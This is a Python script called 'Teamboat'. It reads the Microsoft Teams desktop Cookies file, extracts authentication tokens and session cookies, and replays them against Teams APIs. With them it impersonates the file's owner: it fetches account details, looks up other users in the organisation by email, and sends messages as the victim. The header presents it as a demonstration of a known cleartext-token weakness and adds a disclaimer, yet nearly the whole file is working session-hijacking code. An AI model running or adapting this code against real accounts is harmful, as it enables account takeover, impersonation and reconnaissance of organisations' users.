#!/bin/python3

# Title:         Teamboat
# Author:        Klepvink
# Version:       1.0

###########################################################################################
# Teamboat, a script to automate certain Microsoft Teams functionality using the Cookies-
# file available to non-administrator users of the Microsoft Teams desktop application.
# Since this file is not encrypted or properly protected, an attacker could steal this file
# and authenticate as the victim.

# This script is merely to demonstrate and automate some functionality that is available to
# the attacker in possession of the file. For more information, check out the following:
# https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/

# Please note that using this script for illegal activities and/or with bad intentions is
# strictly prohibited (not cool), and I am not to be held responsible for any harm that is
# caused using this script. Good vibes only, please.
###########################################################################################

# requests does probably still need to be installed using pip
import requests

import json
import random
import sqlite3
import argparse
import urllib.parse

# Parser functions
parser = argparse.ArgumentParser()
parser.add_argument('--message', dest='MESSAGE', type=str,
                    help='Define a message to send to yourself')
parser.add_argument('--cookieInfo', dest='INFO', nargs='?', const='',
                    help='Get info about the cookie')
parser.add_argument('--accountInfo', dest='ACCOUNTINFO', nargs='?', const='',
                    help='Get info about a user account within the organization (takes an email address)')
parser.add_argument('--saveCookieInfo', dest='INFOFILE', type=str,
                    help='Store the raw cookie info in a file')
requiredNamed = parser.add_argument_group('required arguments')

# Takes the file path to the cookies file. By default in windows the path is C:\Users\NAME\AppData\Roaming\Microsoft\Teams\Cookies. Linux and mac cookie files should work aswell.
requiredNamed.add_argument('--cookies', dest='FILENAME', type=str,
                           help='Define the cookie file', required=True)
args = parser.parse_args()

# Setting some variables
requestUserAgent = "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
requestClientInfo = 'os=windows; osVer=undefined; proc=x86; lcid=en-us; deviceType=1; country=us; clientName=skypeteams; clientVer=1415/22073101005; utcOffset=-04:00; timezone=America/New_York'


def banner():
  # Fact, a cool banner increases the speed of a script by 500%
    print("""
        _    _
     __|_|__|_|__
   _|____________|__
  |o o o o o o o o /  Teamboat by Klepvink
~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`~'`
 Please note that using this script for illegal activities and/or with bad intentions is
 strictly prohibited (not cool), and I am not tob e held responsible for any harm that is
 caused using this script. Good vibes only, please.
   """)


def skypeToken():
    # Connect to the Cookie database
    connection = sqlite3.connect(args.FILENAME)
    cur = connection.cursor()

    # Get the skypetoken
    res = cur.execute(
        "SELECT value FROM cookies WHERE name = 'skypetoken_asm' AND host_key LIKE '%teams.microsoft.com'")
    output = res.fetchone()[0]

    # Explicitly close the database connection.
    connection.close()
    return output.strip()


def bearerToken():
    # Connect to the Cookie database
    connection = sqlite3.connect(args.FILENAME)
    cur = connection.cursor()

    res = cur.execute(
        "SELECT value FROM cookies WHERE name = 'authtoken' AND value LIKE '%ear%'")
    output = res.fetchone()[0]

    connection.close()
    return output


def TSREGIONCOOKIE():
    # Connect to the Cookie database
    connection = sqlite3.connect(args.FILENAME)
    cur = connection.cursor()

    res = cur.execute(
        "SELECT value FROM cookies WHERE name = 'TSREGIONCOOKIE'")
    output = res.fetchone()[0]

    connection.close()
    return output


def MUIDB():
    # Connect to the Cookie database
    connection = sqlite3.connect(args.FILENAME)
    cur = connection.cursor()

    res = cur.execute(
        "SELECT value FROM cookies WHERE name = 'MUIDB'")
    output = res.fetchone()[0]

    connection.close()
    return output


def SSOAUTHCOOKIE():
    # Connect to the Cookie database
    connection = sqlite3.connect(args.FILENAME)
    cur = connection.cursor()

    res = cur.execute(
        "SELECT value FROM cookies WHERE name = 'SSOAUTHCOOKIE'")
    output = res.fetchone()[0]

    connection.close()
    return output


def ringFinder():
    # Connect to the Cookie database
    connection = sqlite3.connect(args.FILENAME)
    cur = connection.cursor()

    res = cur.execute(
        "SELECT value FROM cookies WHERE name = 'ringFinder'")
    output = res.fetchone()[0]

    connection.close()
    return output


def getInfo():
    url = "https://emea.ng.msg.teams.microsoft.com/v1/users/ME/properties"

    payload = {}
    headers = {
        'User-Agent': requestUserAgent,
        'Accept': 'json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Authentication': f'skypetoken={skypeToken()}',
        'ClientInfo': requestClientInfo,
        'BehaviorOverride': 'redirectAs404',
        'x-ms-scenario-id': '129',
        'x-ms-user-type': 'null',
        'x-ms-client-type': 'web',
        'x-ms-client-env': 'pds-prod-azsc-frce-01',
        'x-ms-client-version': '1415/1.0.0.2022080828',
        'x-ms-client-cpm': 'ApplicationLaunch',
        'Origin': 'https://teams.microsoft.com',
        'Connection': 'keep-alive',
        'Referer': 'https://teams.microsoft.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'TE': 'trailers'
    }

    response = requests.request("GET", url, headers=headers, data=payload)
    return json.loads(response.content)


def getUserInfo():
    url = f"https://teams.microsoft.com/api/mt/part/emea-03/beta/users/{args.ACCOUNTINFO}/?throwIfNotFound=false&isMailAddress=true&enableGuest=true&includeIBBarredUsers=true&skypeTeamsInfo=true"

    payload = {}
    headers = {
        'User-Agent': requestUserAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'x-ms-client-caller': 'authenticationService',
        'X-Client-UI-Language': 'en-us',
        'Authorization': f"Bearer {urllib.parse.unquote(bearerToken()).split('=', 1)[1].split('&', 1)[0]}",
        'X-Skypetoken': skypeToken(),
        'X-AnchorMailbox': json.loads(getInfo()['userDetails'])['upn'],
        'X-RingOverride': 'general',
        'x-ms-scenario-id': '35',
        'x-ms-user-type': 'null',
        'x-ms-client-type': 'web',
        'x-ms-client-env': 'pds-prod-azsc-frce-01',
        'x-ms-client-version': '1415/1.0.0.2022080828',
        'x-ms-client-cpm': 'ApplicationLaunch',
        'Connection': 'keep-alive',
        'Referer': 'https://teams.microsoft.com/_',
        'Cookie': f'authtoken={bearerToken()}; TSREGIONCOOKIE={TSREGIONCOOKIE()}; MUIDB={MUIDB()}; skypetoken_asm={skypeToken()}; TSAUTHCOOKIE={SSOAUTHCOOKIE()}; TSPREAUTHCOOKIE=true; clocale=en-us; DesiredAuth=msal_dev3; platformid_asm=1415; skypetoken_asm={skypeToken()}; authtoken={bearerToken}; clienttype=web; minimumVersionClientUpdateTries=0; ringFinder={ringFinder()};',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'TE': 'trailers'
    }

    response = requests.request("GET", url, headers=headers, data=payload)

    if response.text == "{}":
        return False

    return response.text


def sendMessage(message):
    # Generate a random messageId. Honestly, idk how this works, but generating a random one seems to work so whatever.
    messageId = str(random.randint(100000000000000000, 999999999999999999))

    # Define the URL that gets called.
    url = "https://emea.ng.msg.teams.microsoft.com/v1/users/ME/conversations/48%3Anotes/messages"

    payload = json.dumps({
        "content": message,
        "messagetype": "RichText/Html",
        "contenttype": "text",
        "amsreferences": [],
        "clientmessageid": messageId,
        "imdisplayname": json.loads(getInfo()['userDetails'])['name'],
        "properties": {
            "importance": "",
            "subject": ""
        }
    })
    headers = {
        'User-Agent': requestUserAgent,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://teams.microsoft.com/',
        'authentication': f'skypetoken={skypeToken()}',
        'behavioroverride': 'redirectAs404',
        'clientinfo': requestClientInfo,
        'content-type': 'application/json',
        'Origin': 'https://teams.microsoft.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'TE': 'trailers'
    }

    response = requests.request("POST", url, headers=headers, data=payload)
    if response.status_code == 201:
        return True

    print(response.content)
    return False


def entryPoint():
    banner()
    if args.INFO is not None:
        userDetails = getInfo()['userDetails']

        print(f"name: {json.loads(userDetails)['name']}")
        print(f"upn: {json.loads(userDetails)['upn']}")
        if getInfo()['licenseType']:
            print(f"licenseType: {getInfo()['licenseType']}")
        print("")

    if args.INFOFILE is not None:
        with open(args.INFOFILE, 'w') as outfile:
            json.dump(getInfo(), outfile)
            print(f"✔️  {args.INFOFILE} was succesfully written!")

    if args.ACCOUNTINFO is not None:
        userOutput = getUserInfo()
        if userOutput == False:
            print("❌  Info on that account could not be found.")
        else:
            print(userOutput)

    if args.MESSAGE is not None:
        print("Attempting to send message...")

        if sendMessage(args.MESSAGE):
            print("✔️  Message sent.")
            exit(0)
        else:
            print("❌  Message could not be send.")
            exit(1)


# Run the script
if __name__ == "__main__":
    entryPoint()
